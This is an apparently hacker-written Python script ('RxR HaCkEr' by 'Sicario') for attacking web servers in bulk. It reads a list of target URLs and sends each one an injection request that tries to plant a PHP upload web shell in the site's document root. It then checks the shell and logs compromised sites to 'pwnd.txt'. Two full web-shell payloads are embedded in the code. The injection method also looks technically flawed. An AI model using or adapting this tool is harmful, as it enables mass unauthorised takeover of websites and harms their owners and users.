import requests
import sys
import os
import re
from multiprocessing import Pool
from multiprocessing.dummy import Pool as ThreadPool
from time import time as timer
from platform import system
from colorama import Fore, Style, init

init(autoreset=True)

import time

####### Colors	 ######
fr = Fore.RED
fc = Fore.CYAN
fw = Fore.WHITE
fg = Fore.GREEN
sd = Style.DIM
sn = Style.NORMAL
sb = Style.BRIGHT

#################################
# RxR HaCkEr Python3 by Sicario #
#################################

shell = """ <?php echo 'RxR HaCkEr_Ye'.'<br>'.'Uname:'.php_uname().'<br>'.$cwd = getcwd(); Echo '<center>  <form method="post" target="_self" enctype="multipart/form-data">  <input type="file" size="20" name="uploads" /> <input type="submit" value="upload" />  </form>  </center></td></tr> </table><br>'; if (!empty ($_FILES['uploads'])) {     move_uploaded_file($_FILES['uploads']['tmp_name'],$_FILES['uploads']['name']);     Echo "<script>alert('upload Done'); 	 	 </script><b>Uploaded !!!</b><br>name : ".$_FILES['uploads']['name']."<br>size : ".$_FILES['uploads']['size']."<br>type : ".$_FILES['uploads']['type']; } ?>"""
shell_2 = """<?php 
// name of the file is: i (it has no extension)
error_reporting(0);
$Ye = "_Ye";
if(isset($_GET["rxr"]))
	{
		echo"RxR HaCkEr{$Ye} <font color=#000FFF>[uname]".php_uname()."[/uname]";echo "<br>";print "\n";if(@ini_get("disable_functions")){echo "DisablePHP=".@ini_get("disable_functions");}else{ echo "Disable PHP = NONE";}echo "<br>";print "\n";if(@ini_get("safe_mode")){echo "Safe Mode = ON";}else{ echo "Safe Mode = OFF";} echo "<br>";print "\n";echo"<form method=post enctype=multipart/form-data>";echo"<input type=file name=f><input name=v type=submit id=v value=up><br>";if($_POST["v"]==up){if(@copy($_FILES["f"]["tmp_name"],$_FILES["f"]["name"])){echo"<b>berhasil</b>-->".$_FILES["f"]["name"];}else{echo"<b>gagal";}} }

echo 'uname:'.php_uname()."\n";
echo getcwd() . "\n";

?>"""

shell_name = str(time.time())[:-3]
filename = "RxR_"+shell_name+".php"

start_raw = input('Your List Please : ')
try:
    with open(start_raw, 'r') as f:
        woh = f.read().splitlines()
except IOError:
    pass
woh = list(woh)


class Master:
    def __init__(self):
        if system() == 'Linux':
            os.system('clear')
        if system() == 'Windows':
            os.system('cls')

        banner = """{}{} \n \n
                    Coded By Sicario
                    RxR HaCkEr Py3 Build
                       
                                       
                \n""".format(fc, sb)

        print(banner)
        self.create_output_file()

    def create_output_file(self):
        try:
            with open("pwnd.txt", "w") as f:
                pass
        except Exception as e:
            print(f"{fr}[{fc}!{fr}] Error occurred while creating the output file: {e}")
            sys.exit()

    def com_rce(self, url):
        try:
            pl = generate_payload("fwrite(fopen($_SERVER['DOCUMENT_ROOT']+'/RxR_"+shell_name+".php','w+'), '<?php "+shell+" ?>')")
            res = requests.get(url + pl, timeout=10)
            if res.status_code == 200:
                shell_url = url + "/RxR_" + shell_name + ".php"
                print(f"{fg}[{fc}*{fg}] Shell uploaded successfully: {shell_url}")
                self.check_shell(url, shell_url)
            else:
                print(f"{fr}[{fc}!{fr}] Upload failed on: {url}")
        except Exception as e:
            print(f"{fr}[{fc}!{fr}] Error occurred: {e}")

    def check_shell(self, url, shell_url):
        try:
            res = requests.get(shell_url, timeout=10)
            if res.status_code == 200:
                if "RxR HaCkEr_Ye" in res.text:
                    print(f"{fg}[{fc}*{fg}] Shell is accessible: {shell_url}")
                    self.save_result(url, shell_url)
                else:
                    print(f"{fr}[{fc}!{fr}] Shell is not accessible on: {url}")
            else:
                print(f"{fr}[{fc}!{fr}] Shell is not accessible on: {url}")
        except Exception as e:
            print(f"{fr}[{fc}!{fr}] Error occurred: {e}")

    def save_result(self, url, shell_url):
        try:
            with open("pwnd.txt", "a") as f:
                f.write(f"{url} -> {shell_url}\n")
        except Exception as e:
            print(f"{fr}[{fc}!{fr}] Error occurred while saving result: {e}")

    def start(self):
        print(f"{fc}[*] Starting the RCE process...\n")
        start_time = timer()
        try:
            pool = ThreadPool(10)
            pool.map(self.com_rce, woh)
            pool.close()
            pool.join()
        except KeyboardInterrupt:
            print(f"\n{fr}[{fc}!{fr}] Keyboard Interrupt detected. Saving results...")
        end_time = timer()
        total_time = end_time - start_time
        print(f"\n{fc}[*] RCE process completed in {total_time:.2f} seconds.")


def generate_payload(code):
    payload = f"/index.php?page=php://filter/convert.base64-encode/resource={code}"
    return payload


if __name__ == '__main__':
    Master().start()

